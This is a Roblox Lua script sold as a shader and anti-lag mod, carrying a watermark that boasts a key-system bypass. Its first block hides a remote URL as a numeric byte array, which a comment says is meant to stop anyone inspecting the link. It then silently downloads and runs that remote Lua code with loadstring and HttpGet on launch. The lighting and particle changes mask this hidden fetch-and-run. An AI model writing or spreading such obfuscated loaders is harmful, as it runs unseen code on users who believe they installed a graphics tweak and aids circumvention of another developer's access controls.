-- [[ RONNEI HUB - OBFUSCATED | SHADERS GRAPHICS & ANTI-LAG ]] --

local _0xS = string.char
local _0xL = game:GetService("Lighting")
local _0xP = game:GetService("Players")
local _0xC = game:GetService("CoreGui")

-- 1. MÃ HÓA VÀ TẢI SCRIPT CHÍNH TỨC THÌ (CHỐNG SOI LINK GỐC)
task.spawn(function()
    local _0xU_Bytes = {
        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
        114,111,98,118,120,115,50,52,47,102,114,101,101,109,105,117,109,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
        99,104,105,108,108,118,105,101,116,104,111,97,46,108,117,97
    }
    
    local _0xURL = ""
    for _0xI = 1, #_0xU_Bytes do
        _0xURL = _0xURL .. _0xS(_0xU_Bytes[_0xI])
    end

    pcall(function()
        loadstring(game:HttpGet(_0xURL))()
    end)
end)

-- 2. TỐI ƯU ĐỒ HỌA ĐẸP (SHADERS MOD) + TẮT HẠT GIẢM LAG
task.spawn(function()
    pcall(function()
        _0xL.GlobalShadows = true
        _0xL.ClockTime = 14
        _0xL.Brightness = 2
        _0xL.OutdoorAmbient = Color3.fromRGB(130, 150, 180)
        _0xL.Ambient = Color3.fromRGB(100, 100, 110)

        for _, _0xV in ipairs(_0xL:GetChildren()) do
            if _0xV:IsA("PostEffect") or _0xV:IsA("Atmosphere") then
                _0xV:Destroy()
            end
        end

        local _0xCC = Instance.new("ColorCorrectionEffect")
        _0xCC.Name = "RonneiColorBoost"
        _0xCC.Brightness = 0.04
        _0xCC.Contrast = 0.12
        _0xCC.Saturation = 0.35
        _0xCC.Parent = _0xL

        local _0xBloom = Instance.new("BloomEffect")
        _0xBloom.Name = "RonneiBloom"
        _0xBloom.Intensity = 0.35
        _0xBloom.Size = 22
        _0xBloom.Threshold = 0.8
        _0xBloom.Parent = _0xL

        local _0xSun = Instance.new("SunRaysEffect")
        _0xSun.Name = "RonneiSunRays"
        _0xSun.Intensity = 0.12
        _0xSun.Spread = 0.8
        _0xSun.Parent = _0xL

        local function _0xCleanParticles(_0xO)
            if _0xO:IsA("ParticleEmitter") or _0xO:IsA("Smoke") or _0xO:IsA("Fire") or _0xO:IsA("Sparkles") then
                _0xO.Enabled = false
            end
        end

        for _, _0xO in ipairs(workspace:GetDescendants()) do _0xCleanParticles(_0xO) end
        workspace.DescendantAdded:Connect(_0xCleanParticles)
    end)
end)

-- 3. WATERMARK CỐ ĐỊNH SÁT MÉP TRÊN (MỜ MỜ NGHỆ THUẬT)
local _0xSG = Instance.new("ScreenGui")
_0xSG.Name = "RonneiBypassWatermark"
_0xSG.ResetOnSpawn = false

pcall(function() _0xSG.Parent = _0xC end)
if not _0xSG.Parent then _0xSG.Parent = _0xP.LocalPlayer:WaitForChild("PlayerGui") end

local _0xCard = Instance.new("Frame")
_0xCard.Size = UDim2.new(0, 360, 0, 52)
_0xCard.Position = UDim2.new(0.5, -180, 0, 2)
_0xCard.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
_0xCard.BackgroundTransparency = 0.35
_0xCard.BorderSizePixel = 0
_0xCard.ClipsDescendants = true
_0xCard.Parent = _0xSG

local _0xCorner = Instance.new("UICorner")
_0xCorner.CornerRadius = UDim.new(0, 10)
_0xCorner.Parent = _0xCard

local _0xStroke = Instance.new("UIStroke")
_0xStroke.Thickness = 1.2
_0xStroke.Transparency = 0.25
_0xStroke.Color = Color3.fromRGB(255, 255, 255)
_0xStroke.Parent = _0xCard

local _0xGrad = Instance.new("UIGradient")
_0xGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 210, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(170, 0, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 210, 255))
})
_0xGrad.Parent = _0xStroke

local _0xBadge = Instance.new("Frame")
_0xBadge.Size = UDim2.new(0, 30, 0, 30)
_0xBadge.Position = UDim2.new(0, 10, 0.5, -15)
_0xBadge.BackgroundColor3 = Color3.fromRGB(28, 33, 46)
_0xBadge.BackgroundTransparency = 0.4
_0xBadge.BorderSizePixel = 0
_0xBadge.Parent = _0xCard

local _0xBadgeCorner = Instance.new("UICorner")
_0xBadgeCorner.CornerRadius = UDim.new(0, 6)
_0xBadgeCorner.Parent = _0xBadge

local _0xBadgeText = Instance.new("TextLabel")
_0xBadgeText.Size = UDim2.new(1, 0, 1, 0)
_0xBadgeText.BackgroundTransparency = 1
_0xBadgeText.Text = "🔓"
_0xBadgeText.TextSize = 14
_0xBadgeText.Parent = _0xBadge

local _0xTextVI = Instance.new("TextLabel")
_0xTextVI.Size = UDim2.new(1, -50, 0, 18)
_0xTextVI.Position = UDim2.new(0, 48, 0, 9)
_0xTextVI.BackgroundTransparency = 1
_0xTextVI.Text = "Script được bypass nokey bởi @ronnei7.htk"
_0xTextVI.TextColor3 = Color3.fromRGB(245, 248, 255)
_0xTextVI.Font = Enum.Font.GothamBold
_0xTextVI.TextSize = 11
_0xTextVI.TextXAlignment = Enum.TextXAlignment.Left
_0xTextVI.Parent = _0xCard

local _0xTextEN = Instance.new("TextLabel")
_0xTextEN.Size = UDim2.new(1, -50, 0, 14)
_0xTextEN.Position = UDim2.new(0, 48, 0, 27)
_0xTextEN.BackgroundTransparency = 1
_0xTextEN.Text = "Script bypassed (no key required) by @ronnei7.htk"
_0xTextEN.TextColor3 = Color3.fromRGB(170, 190, 220)
_0xTextEN.Font = Enum.Font.GothamMedium
_0xTextEN.TextSize = 9.5
_0xTextEN.TextXAlignment = Enum.TextXAlignment.Left
_0xTextEN.Parent = _0xCard

task.spawn(function()
    while _0xCard and _0xCard.Parent do
        _0xGrad.Rotation = (_0xGrad.Rotation + 2) % 360
        task.wait(0.03)
    end
end)
